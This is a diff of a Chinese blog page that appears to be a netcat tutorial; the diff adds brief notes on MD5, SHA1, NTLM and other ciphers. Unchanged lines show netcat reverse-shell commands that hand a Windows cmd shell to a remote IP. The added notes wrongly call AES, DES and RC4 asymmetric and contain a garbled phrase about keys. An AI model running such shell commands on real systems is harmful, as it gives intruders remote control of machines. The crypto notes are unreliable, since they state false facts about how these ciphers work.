@@ -18,7 +18,7 @@
 <meta property="og:description" content="1.Nc瑞士军刀使用详解1.tcp监听tcp监听 nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口 nc -l -p 9999 客户端测试 1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 10.0.1.161 9999 2、B机器上也可以使用nmap扫描A机器的此端口 nmap 10.0.1.161 -p9999">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2023-12-15T15:47:33.000Z">
-<meta property="article:modified_time" content="2023-12-15T15:52:33.349Z">
+<meta property="article:modified_time" content="2023-12-15T16:30:41.141Z">
 <meta property="article:author" content="frozenfish">
 <meta name="twitter:card" content="summary">
   
@@ -275,7 +275,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">713字</span>
+      <span class="post-count">823字</span>
     </span>
   </span>
 
@@ -284,7 +284,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">2分</span>
+      <span class="post-count">3分</span>
     </span>
   </span>
 </div>
@@ -347,7 +347,34 @@ nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354
 nc -t -e cmd 192.168.153.140 5555
 讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口
 </code></pre>
-<h1 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2.加解密"></a>2.加解密</h1>
+<h1 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2.加解密"></a>2.加解密</h1><pre><code class="md5">md5
+ 16位和32位 0-9 和a-f 组成的字符串
+ 
+ 
+ 解密：
+ 1.知道算法
+ 2.碰撞枚举生成密文
+ 
+ 
+ 
+ 有特殊情况。md5会加salt一个字符串。
+
+    discuz
+</code></pre>
+<pre><code class="sha1">SHA1
+和md5特征差不多，只是位数是40
+</code></pre>
+<pre><code class="NTLM">NTLM
+WINDOWS系统哈希密码，标准通讯安全协议
+win7之后使用的密码
+之前是LM
+</code></pre>
+<pre><code>aes，des，rc4
+都是非对称加密。印度密钥，密文特质与base64类似
+</code></pre>
+<pre><code>
+</code></pre>
+
     
 
     
